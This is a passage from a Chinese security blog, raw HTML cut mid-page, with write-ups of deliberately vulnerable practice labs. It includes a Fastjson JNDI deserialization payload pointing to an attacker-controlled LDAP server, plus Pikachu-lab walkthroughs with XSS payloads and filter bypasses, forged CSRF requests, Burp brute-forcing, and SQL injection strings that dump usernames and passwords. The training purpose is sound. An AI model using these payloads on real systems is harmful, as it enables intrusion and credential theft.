class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>发送后会显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311554700.png" alt="image-20240531155441657"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311555719.png" alt="image-20240531155505690"></p>
<p>查看docker文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311556646.png" alt="image-20240531155609569"></p>

        <h1 id="验证码相关漏洞"   >
          <a href="#验证码相关漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码相关漏洞" class="headerlink" title="验证码相关漏洞"></a>验证码相关漏洞</h1>
      
        <h3 id="代码分析-1"   >
          <a href="#代码分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141031.png" alt="image-20240529214056931"></p>
<p>成员变量 <code>Code</code> 用于存储生成的验证码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141142.png" alt="image-20240529214151097"></p>
<p>创建一个 <code>Random</code> 对象生成一个随机数 <code>number</code>，范围在 <code>0</code> 到 <code>899999</code> 之间</p>
<p>将生成的验证码 <code>number</code> 添加到模型中，键为 <code>code</code></p>
<p>将生成的验证码打印到控制台</p>
<p>将成员变量 <code>Code</code> 设置为生成的验证码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292142029.png" alt="image-20240529214237991"></p>
<p>初始化结果字符串 <code>result</code> 为 <code>&quot;fail&quot;</code></p>
<p>检查 <code>code1</code> 是否不为空且不为 <code>0</code>，并且是否与生成的验证码 <code>Code</code> 相等，如果验证通过，打印 <code>true</code> 到控制台，并将 <code>result</code> 设置为 <code>&quot;sueecss&quot;</code>（拼写错了）</p>
<p>将结果字符串 <code>result</code> 添加到模型中，键为 <code>code1</code></p>

        <h3 id="漏洞复现-1"   >
          <a href="#漏洞复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292144331.png" alt="image-20240529214414283"></p>
<p>获取验证码</p>
<p>在这里可以找到生成的随机数，即验证码（直接查看网页源代码也有）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145052.png" alt="image-20240529214501002"></p>
<p>输入登录后，返回sueecss</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145841.png" alt="image-20240529214532798"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-30</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="暴力破解"   >
          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
      
        <h2 id="基于表单的暴力破解"   >
          <a href="#基于表单的暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231310101.png" alt="image-20240523131040028"></p>
<p>随便输入登录，抓包并发送到Intruder，选择集束攻击，并标好payload位置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231310194.png" alt="image-20240523130854587"></p>
<p>在payload里上传字典，开始攻击，发现有数据的返回包的数据长度不一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231311692.jpg" alt="img"></p>
<p>爆破出账号密码，点击数据包确认一下，爆破成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231312382.png" alt="image-20240523131252343"></p>

        <h2 id="验证码绕过-on-server"   >
          <a href="#验证码绕过-on-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231313733.png" alt="image-20240523131332711"></p>
<p>随便输入一串数字登录，抓包并发送到Intruder，验证码改成正确的，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231314702.jpg" alt="img"></p>

        <h2 id="验证码绕过-on-client"   >
          <a href="#验证码绕过-on-client" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231314905.png" alt="image-20240523131459880"></p>
<p>随便输入一串数字登录，抓包并发送到Intruder，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231315971.jpg" alt="img"></p>

        <h2 id="token防爆破"   >
          <a href="#token防爆破" class="heading-link"><i class="fas fa-link"></i></a><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231320565.png" alt="image-20240523132046539"></p>
<p>抓包，获取响应后token值不一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231327067.png" alt="image-20240523132714015"></p>
<p>按DVWA靶场High级别的步骤进行爆破</p>
<p>最终获得账号和密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231329885.png" alt="image-20240523132954839"></p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      
        <h2 id="反射型xss-get"   >
          <a href="#反射型xss-get" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2>
      <p>看到有一个输入框</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231332325.png" alt="image-20240523133241298"></p>
<p>随便输点内容并提交，可以看到URL上出现了输入的内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231333776.png" alt="image-20240523133355743"></p>
<p>尝试了一下这个输入框有输入数量限制，可以直接在URL上给message传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231334161.png" alt="image-20240523133453131"></p>

        <h2 id="反射性xss-post"   >
          <a href="#反射性xss-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射性xss-post" class="headerlink" title="反射性xss(post)"></a>反射性xss(post)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231335614.png" alt="image-20240523133523588"></p>
<p>登录一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231335522.png" alt="image-20240523133551494"></p>
<p>直接在框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231339666.png" alt="image-20240523133956631"></p>

        <h2 id="存储型xss"   >
          <a href="#存储型xss" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231340960.png" alt="image-20240523134033933"></p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后出现弹窗，并且在删除之前每点进这个页面就会出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231341095.png" alt="image-20240523134121056"></p>

        <h2 id="DOM型xss"   >
          <a href="#DOM型xss" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231345475.png" alt="image-20240523134524446"></p>
<p>输入提交试试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231345380.png" alt="image-20240523134552347"></p>
<p>点击蓝色链接结果却是404，有点击这个操作，换一个标签试试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>再点击蓝色链接，出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231347713.png" alt="image-20240523134718678"></p>

        <h2 id="DOM型xss-x"   >
          <a href="#DOM型xss-x" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231348227.png" alt="image-20240523134847194"></p>
<p>按上一题一样尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349083.png" alt="image-20240523134923058"></p>
<p>点击蓝色链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349823.png" alt="image-20240523134936799"></p>
<p>再点第一个链接，成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349939.png" alt="image-20240523134959903"></p>

        <h2 id="xss盲打"   >
          <a href="#xss盲打" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231350831.png" alt="image-20240523135019800"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>但是提交后没反应，看看提示，说让登录去后台看看，登录后即出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231355165.png" alt="image-20240523135553131"></p>
<p>登录进去后也能看到留言板内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231357174.png" alt="image-20240523135729144"></p>

        <h2 id="xss之过滤"   >
          <a href="#xss之过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231357401.png" alt="image-20240523135747377"></p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交可以看到是被过滤了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231358749.png" alt="image-20240523135816726"></p>

        <h3 id="大小写绕过"   >
          <a href="#大小写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;alert(/xss/)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231401969.png" alt="image-20240523140103929"></p>

        <h3 id="其他标签"   >
          <a href="#其他标签" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231408403.png" alt="image-20240523140854372"></p>

        <h2 id="xss之htmlspecialchars"   >
          <a href="#xss之htmlspecialchars" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231409420.png" alt="image-20240523140933393"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后又有一个蓝色链接可以点击，这个点击后显示403，又换成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231412235.png" alt="image-20240523141230203"></p>

        <h2 id="xss之href输出"   >
          <a href="#xss之href输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231414102.png" alt="image-20240523141453076"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后又有一个蓝色链接可以点击，这个点击后显示403，又换成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>还是不行</p>
<p>再尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231423889.png" alt="image-20240523142324853"></p>

        <h2 id="xss之js输出"   >
          <a href="#xss之js输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231426393.png" alt="image-20240523142646368"></p>
<p>三条都尝试了还是不行，推测可能和闭合有关</p>
<p>先闭合前面的<script>标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231426354.png" alt="image-20240523142629317"></p>

        <h1 id="CSRF"   >
          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
      
        <h2 id="CSRF-get-login"   >
          <a href="#CSRF-get-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-get-login" class="headerlink" title="CSRF(get) login"></a>CSRF(get) login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231429396.png" alt="image-20240523142904373"></p>
<p>点击右上角的提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231429974.jpg" alt="img"></p>
<p>随机尝试一个用户登录，此处以vince用户登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430882.jpg" alt="img"></p>
<p>登录成功修改个人信息为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430885.jpg" alt="img"></p>
<p>发送后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430893.jpg" alt="img"></p>
<p>可以看到是以GET方法请求数据，可以直接在抓包的url上修改信息，构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=male&amp;phonenum=123456&amp;add=chongqing&amp;email=123456.com&amp;submit=submit HTTP/1.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430896.jpg" alt="img"></p>
<p>发送之后停止拦截可以看到网页上的信息已经修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231430902.jpg" alt="img"></p>

        <h2 id="CSRF-post-login"   >
          <a href="#CSRF-post-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-post-login" class="headerlink" title="CSRF(post) login"></a>CSRF(post) login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431414.png" alt="image-20240523143125386"></p>
<p>还是根据提示登录vince的账号，还是保持之前的登录和上一步修改后的信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431357.jpg" alt="img"></p>
<p>修改个人信息后抓包发现url上没有显示参数，那就不能通过修改url来发送请求了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431355.jpg" alt="img"></p>
<p>可以按F12直接修改信息，信息修改成功！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231431364.jpg" alt="img"></p>

        <h2 id="CSRF-Token-login"   >
          <a href="#CSRF-Token-login" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF-Token-login" class="headerlink" title="CSRF Token login"></a>CSRF Token login</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231447006.png" alt="image-20240523144727966"></p>
<p>依然是用Vince的账号登录，修改个人信息后抓包发现有token验证</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231440379.png" alt="image-20240523144025332"></p>
<p>在扩展-BApp商店里找到CSRF Token Tracker安装下载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231446031.png" alt="image-20240523144630977"></p>
<p>设置一下规则</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231447095.png" alt="image-20240523144700052"></p>
<p>将抓到的包发到Repeater，点击发送看到信息并未修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231444583.png" alt="image-20240523144441522"></p>
<p>再点击跟随重定向，发现信息修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231445588.png" alt="image-20240523144555530"></p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/115771540" >https://blog.csdn.net/elephantxiang/article/details/115771540</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="数字型注入"   >
          <a href="#数字型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231448325.png" alt="image-20240523144858298"></p>
<p>只能选择数字，并且URL上没有数据，那么抓包发送到Repeater注入1 OR 1=1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231450844.png" alt="image-20240523145051807"></p>
<p>确实存在注入，并且把所有信息都列出来了</p>
<p>然后可以按DVWA中的Medium难度一点一点注入，最终得到所有的username和password</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231455980.png" alt="image-20240523145554927"></p>

        <h2 id="字符型注入"   >
          <a href="#字符型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231456877.png" alt="image-20240523145629850"></p>
<p>同DVWA靶场的Low难度，最终得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231500546.png" alt="image-20240523150019503"></p>

        <h2 id="搜索型注入"   >
          <a href="#搜索型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231521638.png" alt="image-20240523152138609"></p>
<p>输入一个v，会返回用户名中所有含v的信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241431942.png" alt="image-20240524143157907"></p>
<p>可以猜想后台使用了数据库中的搜索这个逻辑，比如用了LIKE，就可以构造对应的闭合，闭合前面的 单引号和百分号，注释后面的百分号和单引号</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v%&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>

<p>所有成员的信息都出来了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241441903.png" alt="image-20240524144148860"></p>

        <h4 id="查看列数"   >
          <a href="#查看列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,3;#</span><br><span class="line">%&#x27; union select 1,2,3,4;# //报错</span><br></pre></td></tr></table></div></figure>

<p>所以有三列</p>

        <h4 id="获取当前数据库"   >
          <a href="#获取当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241451230.png" alt="image-20240524145107197"></p>

        <h4 id="获取数据表名"   >
          <a href="#获取数据表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241510679.png" alt="image-20240524151013642"></p>

        <h4 id="查看表字段名"   >
          <a href="#查看表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241511878.png" alt="image-20240524151122845"></p>

        <h4 id="查看字段内容"   >
          <a href="#查看字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#x27; union select 1,2,group_concat(username,password) from pikachu.users;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241512700.png" alt="image-20240524151240662"></p>

        <h2 id="xx型注入"   >
          <a href="#xx型注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231522288.png" alt="image-20240523152202259"></p>
<p>提示告诉我们要制造闭合，具体是什么样的闭合只能看一下后台源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241521128.png" alt="image-20240524152125089"></p>
<p>用括号的方式拼接SQL查询语句</p>
<p>方法同理</p>

        <h2 id="”Insert-Update”注入"   >
          <a href="#”Insert-Update”注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#”Insert-Update”注入" class="headerlink" title="”Insert/Update”注入"></a>”Insert/Update”注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231522223.png" alt="image-20240523152254190"></p>
<p>点击注册，让我们填写信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261431092.png" alt="image-20240526142959198"></p>
<p>随便填写后抓个包，看出是POST方式传参，而且有username、password、sex、email、add、submit这几个参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261432728.png" alt="image-20240526143241658"></p>

        <h3 id="Insert注入"   >
          <a href="#Insert注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#Insert注入" class="headerlink" title="Insert注入"></a>Insert注入</h3>
      <p>将username的值修改为1’ or ‘1’=’1，提示注册成功，所以是单引号闭合的字符型注入</p>
<p>接下来就可以获取一些数据了</p>

        <h4 id="获取数据库"   >
          <a href="#获取数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><code>updatexml()</code>: 这个函数用于修改XML文档并返回结果。如果第一个参数不是一个有效的XML文档，或者XPath表达式（第二个参数）无法执行，则会产生一个错误</p>
<p><code>concat()</code>: 用来连接字符串</p>
<p><code>0x7e</code>: 这是波浪号（~）的十六进制表示，常用作数据分隔符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261442193.png" alt="image-20240526144218147"></p>

        <h4 id="获取数据库表名"   >
          <a href="#获取数据库表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
